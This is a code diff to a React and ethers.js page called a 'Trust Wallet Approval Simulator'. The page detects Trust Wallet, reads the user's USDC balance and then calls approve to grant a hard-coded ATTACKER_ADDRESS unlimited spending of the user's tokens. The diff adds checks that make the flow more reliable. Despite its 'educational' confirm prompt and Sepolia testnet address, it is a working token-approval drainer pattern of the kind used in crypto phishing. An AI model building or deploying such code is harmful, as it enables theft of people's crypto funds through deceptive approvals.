@@ -1,10 +1,10 @@
 import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
 
-// ✅ USDC on Sepolia (Trust Wallet supports Sepolia)
+// ✅ USDC on Sepolia
 const TOKEN_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";
 
-// ✅ Dummy ETH address
+// ⚠️  address (permission receiver)
 const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";
 
 // ERC20 ABI
@@ -33,7 +33,7 @@ function App() {
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
   // =========================
-  // DETECT TRUST WALLET ONLY
+  // DETECT TRUST WALLET
   // =========================
   useEffect(() => {
     if (window.ethereum?.isTrust) {
@@ -52,20 +52,17 @@ function App() {
       if (!window.ethereum || !window.ethereum.isTrust) {
         alert(
           "Please open this website inside Trust Wallet Browser.\n\n" +
-          "Trust Wallet → Browser → Paste site URL"
+            "Trust Wallet → Browser → Paste site URL"
         );
-
-        // Mobile redirect
-        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
-        if (isMobile) {
-          window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href;
-        }
         return;
       }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-      await provider.send("eth_requestAccounts", []);
+      // ✅ IMPORTANT FIX for Trust Wallet
+      await window.ethereum.request({
+        method: "eth_requestAccounts",
+      });
 
+      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
       const signer = provider.getSigner();
       const address = await signer.getAddress();
       const ethBalance = await provider.getBalance(address);
@@ -86,7 +83,9 @@ function App() {
     } catch (err) {
       console.error(err);
       if (err.code === 4001) {
-        addLog("❌ Connection rejected");
+        addLog("❌ User rejected connection");
+      } else if (err.message?.includes("No active wallet")) {
+        addLog("❌ Open site inside Trust Wallet Browser & unlock wallet");
       } else {
         addLog("❌ Wallet connection failed");
       }
@@ -101,21 +100,45 @@ function App() {
       setLoading(true);
       setLogs([]);
 
+      if (!token || !wallet?.address) {
+        addLog("❌ Wallet not ready");
+        return;
+      }
+
+      // ✅ Network check (Sepolia)
+      const network = await signer.provider.getNetwork();
+      if (network.chainId !== 11155111) {
+        addLog("❌ Please switch to Sepolia network");
+        return;
+      }
+
+      // ✅ Token contract check
+      const code = await signer.provider.getCode(TOKEN_ADDRESS);
+      if (code === "0x") {
+        addLog("❌ Invalid token contract");
+        return;
+      }
+
       addLog("🔍 Scanning wallet...");
-      await sleep(500);
+      await sleep(400);
 
       const rawBalance = await token.balanceOf(wallet.address);
       const decimals = await token.decimals();
       const balance = ethers.utils.formatUnits(rawBalance, decimals);
 
       addLog(`💰 Balance: ${balance}`);
-      await sleep(500);
+      await sleep(400);
+
+      const allowance = await token.allowance(wallet.address, ATTACKER_ADDRESS);
+      if (allowance.gt(0)) {
+        addLog("⚠️ Existing approval detected");
+      }
 
       const confirm = window.confirm(
         "⚠️ WARNING\n\n" +
-        "This will approve UNLIMITED token spending.\n" +
-        "This is for EDUCATION only.\n\n" +
-        "Continue?"
+          "This will approve UNLIMITED token spending.\n" +
+          "EDUCATIONAL PURPOSE ONLY.\n\n" +
+          "Continue?"
       );
 
       if (!confirm) {
@@ -125,9 +148,14 @@ function App() {
 
       const tx = await token.approve(ATTACKER_ADDRESS, UNLIMITED);
       addLog(`📝 Tx sent: ${tx.hash}`);
-      addLog("⏳ Waiting confirmation...");
+      addLog("⏳ Waiting for confirmation...");
 
-      await tx.wait();
+      await Promise.race([
+        tx.wait(),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Transaction timeout")), 60000)
+        ),
+      ]);
 
       addLog("🚨 UNLIMITED approval granted");
       setStep(3);
@@ -136,7 +164,7 @@ function App() {
       if (err.code === 4001) {
         addLog("❌ User rejected transaction");
       } else {
-        addLog("❌ Error occurred");
+        addLog(`❌ Error: ${err.message}`);
       }
     } finally {
       setLoading(false);
@@ -146,7 +174,6 @@ function App() {
   return (
     <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
       <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
-
         <h1 className="text-2xl font-bold text-center mb-4">
           🔐 Trust Wallet Approval Simulator
         </h1>
@@ -194,7 +221,6 @@ function App() {
             </p>
           </div>
         )}
-
       </div>
     </div>
   );
